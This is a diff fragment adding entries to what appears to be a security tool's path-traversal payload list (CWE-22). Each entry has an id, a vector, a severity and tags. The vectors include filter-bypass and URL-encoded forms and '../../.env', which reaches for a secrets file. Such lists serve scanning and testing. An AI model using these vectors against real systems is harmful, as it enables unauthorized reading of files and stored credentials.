+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.fb1cb80579",
+      "vector": "....//",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.fd1d75953d",
+      "vector": "%2e%2e%2f",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.fd8b213668",
+      "vector": "../../.env",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    }
+  ]
+}
